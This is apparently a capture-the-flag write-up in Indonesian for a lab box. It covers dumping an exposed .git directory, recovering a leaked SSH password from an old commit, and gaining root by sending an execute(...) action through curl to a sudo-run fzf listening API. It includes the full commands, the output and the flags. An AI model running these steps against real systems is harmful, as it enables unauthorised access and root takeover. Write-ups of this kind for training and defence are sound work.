# Forgotten Commit (Root) — Eksploitasi / Solver

[← Overview](01-forgotten-commit-root.md) · [Index](index.md)

### 3.1 Strategi

1. Dump `.git` dari webroot.
2. Baca inventory di commit lama untuk mendapatkan kredensial SSH.
3. SSH sebagai `leonardo`, baca user flag.
4. Cek `sudo -n -l`; temukan `fzf --listen 1337` sebagai root.
5. Jalankan fzf sebagai root, lalu kirim action `execute(...)` ke
   `127.0.0.1:1337`.
6. Copy `/root/root.txt` ke lokasi yang bisa dibaca, lalu `cat`.

### 3.2 Langkah exploit

```bash
# 1) Dump repository dari webroot
git-dumper http://10.10.20.21/ /tmp/nexus_repo

# 2) Lihat history dan ambil inventory lama
git -C /tmp/nexus_repo log --oneline --all --decorate
git -C /tmp/nexus_repo show --stat --oneline 3f4c118
git -C /tmp/nexus_repo show bff2915:ansible/inventory.ini

# 3) SSH dengan kredensial hasil leak
ssh leonardo@10.10.20.21
# Dev0pment#2026!

# 4) Baca user flag dan cek sudo
cat /home/leonardo/user.txt
sudo -n -l
```

Di dalam sesi SSH, jalankan fzf sebagai root. Karena fzf membutuhkan terminal,
lakukan di PTY (sesi SSH interaktif) dan biarkan berjalan:

```bash
sudo -n /usr/local/bin/fzf --listen 1337
```

Dari sesi SSH kedua (atau background job), kirim action remote-control:

```bash
curl -sS -X POST --data-binary \
  'execute(cp /root/root.txt /tmp/rootflag; chmod 644 /tmp/rootflag)' \
  http://127.0.0.1:1337/
```

Action `execute(...)` menjalankan command di shell, sehingga `cp` dan `chmod`
dieksekusi sebagai root. Setelah itu:

```bash
cat /tmp/rootflag
```

### 3.3 Output

```text
leonardo@...$ cat /home/leonardo/user.txt
NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}

leonardo@...$ sudo -n -l
User leonardo may run the following commands on ...:
    (root) NOPASSWD: /usr/local/bin/fzf --listen 1337

leonardo@...$ /usr/local/bin/fzf --version
fzf 0.74.3

# terminal lain:
leonardo@...$ curl -sS -X POST --data-binary \
  'execute(cp /root/root.txt /tmp/rootflag; chmod 644 /tmp/rootflag)' \
  http://127.0.0.1:1337/

leonardo@...$ cat /tmp/rootflag
NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}
```

### 3.4 Kenapa fzf bisa menjadi privesc

`fzf --listen 1337` membuka HTTP API untuk mengirim action. API ini tidak
memiliki autentikasi dan hanya mengandalkan posisi jaringan (loopback). Begitu
fzf dijalankan dengan `sudo`, seluruh action `execute(...)` dieksekusi dengan
UID 0. Jadi kombinasinya berbahaya:

- `sudo` memberikan ekuivalensi root kepada binary yang memang punya fitur
  menjalankan command.
- `--listen` membuka jalur kontrol dari proses lokal mana pun.
- Tidak ada pembatasan command, argumen, atau user yang boleh mengirim action.

Ini bukan bug memory corruption; ini penyalahgunaan fitur sah fzf yang diberikan
hak root tanpa pembatasan.
